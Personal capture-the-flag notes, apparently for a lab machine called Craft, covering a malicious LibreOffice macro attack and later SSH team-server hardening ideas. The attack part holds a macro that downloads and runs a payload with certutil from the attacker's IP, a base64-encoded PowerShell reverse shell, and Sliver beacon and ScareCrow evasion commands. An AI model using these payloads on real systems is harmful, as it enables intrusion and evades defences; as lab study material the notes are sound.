# Craft Notes

## Data 

IP: 
OS:
Arch:
Hostname:
DNS:
Domain:  / Domain SID:
Machine Purpose: 
Services:
Service Languages:
Users:
Email and Username Formatting:
Credentials:

## Objectives

`\#\# Target Map ![](Craft-map.excalidraw.md)`

#### Machine Connects to list and reason:

[[]] - Reason X
└─$ iconv -f ASCII -t UTF-16LE psrev.txt | base64 | tr -d "\n"
## Data Collected

#### Credentials
```
```

#### HUMINT


#### Solution Inventory Map


#### Todo 


#### Timeline of tasks completed
      
nmapwinx64.png
craftadmin.png

ippsec's .html or .php
indexhtml.png

indexphp.png
submitaodtfile.png

Before I get carried away I checked if we can view the uploads directory 
uploadsdir.png

[[cgi-printenv-http___192.168.180.169_cgi-bin_printenv.pl]]
printenv.png

Proof there is no vhost or admin account 

extensionchangetest.png


appendodt.png

waititis.png

[[missing-sri-http___192.168.180.169_]] https://www.tenable.com/plugins/was/98647

oneminutetopwnagainthen.png

uploadsdirheader.png

libreoffice_macro_exec.png


https://dominicbreuker.com/post/htb_re/

https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/fileformat/libreoffice_macro_exec

https://www.rapid7.com/blog/post/2017/03/08/attacking-microsoft-office-openoffice-with-metasploit-macro-exploits/

https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html
1. Open any LibreOffice application.
2. Go to Tools > Macros > Organize Macros > Basic to open the Basic Macros dialog ([Figure 1](https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html#seqrefFigure0)).
3. Click Organizer to open the Basic Macro Organizer dialog ([Figure 2](https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html#seqrefFigure1)) and select the Libraries tab.
4. Set the Location drop-down to My Macros & Dialogs, which is the default location.
5. Click New to open the New Library dialog (not shown here).
6. Enter a library name, for example TestLibrary, and click OK.
7. On the Basic Macro Organizer dialog, select the Modules tab ([Figure 3](https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html#seqrefFigure2))
8. In the Module list, expand My Macros and select your library (in the example, TestLibrary). A module named Module1 already exists and can contain your macro. If you wish, you can click New to create another module in the library.
9. Select Module1, or the new module that you created, and click Edit to open the Integrated Development Environment (IDE) ([Figure 4](https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html#seqrefFigure3)). The IDE is a text editor and associated facilities that are built into LibreOffice and allow you to create, edit, run, and debug macros.

Organise -> Assign -> Events -> Pick good events

learningtomacro.png


Pun O'Clock sliver-me-libres! 
slivermelibres.png


ITWORKS.png

But no beacon or session.
nobaconorsausage.png

```bash
iconv -f ASCII -t UTF-16LE psrev.txt | base64 | tr -d "\n"
```

```bash
generate beacon --mtls  192.168.45.173:4445 --arch amd64 --os windows --save /tmp/sliver.bin -f shellcode -G


/opt/ScareCrow/ScareCrow -I /tmp/sliver.bin  -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 

GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"

upx 

mtls -L 192.168.45.173 -l 4445
```

Tried `C:\Windows\Temp`, but I probably did not have permissions as this is most probably a later Windows 10 machine, I also add simple PowerShell reverse shell just because it is a CTF so more attempt in one go the better.
```vb
Shell("certutil.exe -urlcache -split -f 'http://192.168.45.173/install.exe' 'C:\programdata\install.exe'")
Shell("C:\programdata\install.exe")
Shell("powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAzACcALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA")
```

sadness.png

I also may have failed as I also add the event when the application is closed which may have over written the sliver beacon

Phind helped with `Call` and `Application.Wait (Now + TimeValue("00:02:00"))`

Wait two minute for certutil to finish downloading the sliver beacon  
```vb

Sub Main

	Shell(cmd /c "certutil.exe -urlcache -split -f 'http://192.168.45.173/install.exe' 'C:\programdata\install.exe'")
	Shell(cmd /c "powershell.exe -enc ", 0)
	Shell("powershell.exe -enc ", 0)
	Application.Wait (Now + TimeValue("00:02:00"))
	Call Shell(cmd /c "C:\programdata\install.exe", 0)

Sub End
```
- Try [Call - vba](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/call-statement) 
- check cite
Asking Phind about powershell 5.1 and 7.1+ [cites](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1) 
```
which versions of powershell have disable or no "-enc" flag
```

```
Dim dteWait dteWait = DateAdd("s", 5.0, Now())

```

- There may also not be powershell... but that seems very unlikely, but pg boxes have weird stuff like just having `nc -e` netcat on a box ...

The reason this died not work is because I am not VBS chair jumping individual or VB Paperclip smiling expert and I still remember my issues with VB [[fiveminslateWord2urMother]] section of Throwback. 

```vb
Shell(pathname, windowstyle)
```

|Constant|Value|Description|
|---|---|---|
|**vbHide**|0|Window is hidden and focus is passed to the hidden window. The **vbHide** constant is not applicable on Macintosh platforms.|
|**vbNormalFocus**|1|Window has focus and is restored to its original size and position.|
|**vbMinimizedFocus**|2|Window is displayed as an icon with focus.|
|**vbMaximizedFocus**|3|Window is maximized with focus.|
|**vbNormalNoFocus**|4|Window is restored to its most recent size and position. The currently active window remains active.|
|**vbMinimizedNoFocus**|6|Window is displayed as an icon. The currently active window remains active.|



ssh server for Linux and securing it 
General server-client
- Usernames and hashicorp vault
	- 
	- MFA - for another beyond root
- Server
	- Ubuntu 
		- more normal amongst normal - more overhead deal with extra packages
	- Alternatives and suggestions from 
		- https://www.gartner.com/reviews/market/privileged-access-management/vendor/ssh/alternatives
		- https://linuxsecurity.expert/tools/openssh/alternatives/
	- Server possibles...
		- Openssh
		- Microsoft server nano + Putty / Cygwin
- Alternatives
	- Docker?
		- more portable, less apt management, more configurable - image size is smaller
		-  But docker ports for hosting and then the additional routing technical debt



- IT'S A TRAP - Getting the beyond root time sinks done
	- Cowrie - 2 honeypots and 1 real to waste time 
	- Fail2ban 
	- Iptables
	- ssh-audit - test  `docker pull positronsecurity/ssh-audit` as python madness
	- Veloraptor endpoint 
	- ufw
	- rbash for jailing
	- Apparmor


```bash

# VPN_SERVER_IP=
SLIVER_TEAM_SERVER_IP=
VELOCIRAPTOR_SERVER_IP=

apt update -y && apt upgrade -y && apt autoremove -y
wait
# Required
apt install apparmor fail2ban git iptables openssh-server rbash ufw -y
wait
systemctl stop fail2ban
wait
systemctl disable fail2ban 
wait

cd /opt/
git clone https://github.com/cowrie/cowrie.git
wait
# Tunneling
# apt install sshuttle -y
# wait
# git clone https://github.com/jpillora/chisel.git 
# wait
cd ~


# Networking configuration


echo "$VELOCIRAPTOR_SERVER_IP ." | tee -a /etc/hosts
echo "$SLIVER_TEAM_SERVER_IP ." | tee -a /etc/hosts


# User and group configuration

# Add users 
# tunnel for tunneling with some tool
groupadd tunnel
groupadd honeypot

useradd -u tunnel -g $(getent group tunnel | cut -d: -f3) -p tunnel -s $(which rbash) -m /tunnel
useradd -u honeypot -g $(getent group honeypot | cut -d: -f3) -p honeypot -s $(which rbash) -m /honeypot


# Put honeypot, tunnel user in a jail just in case 
# add jail configuration instruction per tool for root/admin to make only on behalf of tunnel

# Edit /etc/ssh/sshd_config
# no root logon
# no passwordauthenication
# make sure it is `Protocol 2`
# change the port
# configure listening interface if listenInternet is not passed as null
# etc
/etc/ssh/sshd_config

PasswordAuthentication no 
PubkeyAuthentication yes
PermitRootLogin no
X11Forwarding no
PermitEmptyPasswords no
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax is 0
Banner /etc/ssh/sshd-banner
HostKey /etc/ssh/ssh_host_rsa_key


# Message of the day 
/etc/motd

# Team banner 
/etc/ssh/sshd_banner

# Configure allowed hosts
/etc/hosts.allow

sshd : 192.168.1.200 : ALLOW  
sshd : 192.168.1.201 : ALLOW  
sshd : ALL : DENY

# Cowie honeypots - check venv and /opt/cowrie
cd /home/honeypot
python3 -m .venv-22
python3 -m .venv-2222



ufw allow # ssh https://www.cyberciti.biz/faq/ufw-allow-incoming-ssh-connections-from-a-specific-ip-address-subnet-on-ubuntu-debian/
# 22 and 2222 are honeypots


ufw enable

systemctl start fail2ban 
systemctl enable fail2ban 
systemctl start sshd 
systemctl enable sshd
systemctl status sshd
netstat -tulnp | grep ssh
ufw status=

echo ""
echo ""
echo "CHANGE THE honeypot : honeypot and tunnel : tunnel user passwords from the defaults displayed!"
echo ""
echo ""
```


- [[Fail-Helped-Through]] for `fail2ban configuration` 
- X for `iptables` configuration

Sliver install and configuration
```bash

apt install mingw-w64-x86-64-dev gcc-mingw-w64-x86-64 gcc-mingw-w64 -y 
curl https://sliver.sh/install| bash
wait
# Sliver configuration

```
https://www.linuxteck.com/install-and-secure-ssh-server-in-linux/
https://itsfoss.com/set-up-ssh-ubuntu/
https://www.ibm.com/docs/fr/tnpm/1.4.5?topic=openssh-configuring-server-linux 

Velociraptor Server
```bash
# General tears - npm BEWARE

# Golang required!
apt update -y && apt upgrade -y && apt autoremove -y
wait
apt install gcc make mingw-w64-x86-64-dev gcc-mingw-w64-x86-64 gcc-mingw-w64 npm -y 
wait
cd /opt/ 
git clone https://github.com/Velocidex/velociraptor.git
wait
cd velociraptor
cd gui/velociraptor/
npm install
wait
make build
wait
cd ../..
# Production binaries
make linux
wait
make windows
wait
cd ~
```


(Re)manage host and client rsa keys
```bash
# Check where host key is 
cat /etc/ssh/sshd_config | grep HostKey | grep -v
# multiple host keys issue
 

```


- Extra fancy Ideal world `Wireguard VPN server ->  ssh server -> pfsenseAuditTunnel -> Sliver Team server -> additional resources subnet`
	- Privilege Session management and recording of all activity with PSM https://docs.cyberark.com/PAS/12.6/en/Content/PASIMP/PSSO-PMSP.htm on each box
	- HashiCorp Ssh secrets vault. - https://www.hashicorp.com/blog/managing-ssh-access-at-scale-with-hashicorp-vault
		- Issue - IDP could be just breezed through if not implemented properly for this because why use an IDP for a sliver team server...
		- it *could* just be the same problem just with additional certificate, without management of keys problems - even though there is still keys exchanged it is just signed.
		- But has RBAC 

Beyond Root - No Phish just the red team Brown fish system admin headaches 




Generate keys for team-server - https://developer.hashicorp.com/vault/docs/secrets/ssh/signed-ssh-certificates
```
```

Generate keys for sliver-clients - https://developer.hashicorp.com/vault/docs/secrets/ssh/signed-ssh-certificates


More Windows weirdness and considerations for sliver - ssh setup from a Blackhill video that one person that uses Windows ssh configuration script for them 
- create a new user 
- install and configure ssh and keys
- configure /system32/Drivers/etc/hosts
- Vault ssh secrets because normal ssh not team server project and 

```powershell

$password 

net user sshserver $password /add

# Download Hashicorp Vault binary - beware arch
https://developer.hashicorp.com/vault/install

# Verify installation
vault.exe -h

```


And Windows Ssh server if the team server has to be Windows for some weird reason
- Alternatives to fail2ban
- Dealing with no-Windows Defend on a system that has subsystem for Linux with all the *that* entails from a system administrator perspective  
- 
https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse?tabs=gui
https://winscp.net/eng/docs/guide_windows_openssh_server

https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_server_configuration

Side tracked a little in the different Windows \*scripts...



[csript](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cscript) *Starts a script to run in a command-line environment.*

```powershell
cscript <scriptname.extension> [/b] [/d] [/e:<engine>] [{/h:cscript | /h:wscript}] [/i] [/job:<identifier>] [{/logo | /nologo}] [/s] [/t:<seconds>] [x] [/u] [/?] [<scriptarguments>]
```

|Parameter|Description|
|---|---|
|scriptname.extension|Specifies the path and file name of the script file with optional file name extension.|
|/b|Specifies batch mode, which does not display alerts, scripting errors, or input prompts.|
|/d|Starts the debugger.|
|/e:`<engine>`|Specifies the engine that is used to run the script.|
|/h:cscript|Registers cscript.exe as the default script host for running scripts.|
|/h:wscript|Registers wscript.exe as the default script host for running scripts. The default.|
|/i|Specifies interactive mode, which displays alerts, scripting errors, and input prompts. The default, and the opposite of `/b`.|
|/job:`<identifier>`|Runs the job identified by _identifier_ in a .wsf script file.|
|/logo|Specifies that the Windows Script Host banner is displayed in the console before the script runs. The default, and the opposite of `/nologo`.|
|/nologo|Specifies that the Windows Script Host banner is not displayed before the script runs.|
|/s|Saves the current command-prompt options for the current user.|
|/t:`<seconds>`|Specifies the maximum time the script can run (in seconds). You can specify up to 32,767 seconds. The default is no time limit.|
|/u|Specifies Unicode for input and output that is redirected from the console.|
|/x|Starts the script in the debugger.|
|/?|Displays available command parameters and provides help for using them. The same as typing **cscript.exe** with no parameters and no script.|
|scriptarguments|Specifies the arguments passed to the script. Each script argument must be preceded by a slash (**/**).|






Vault 
```bash
# Install hashicorp
wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list
sudo apt update && sudo apt install vault
# Verify installation
vault -h
```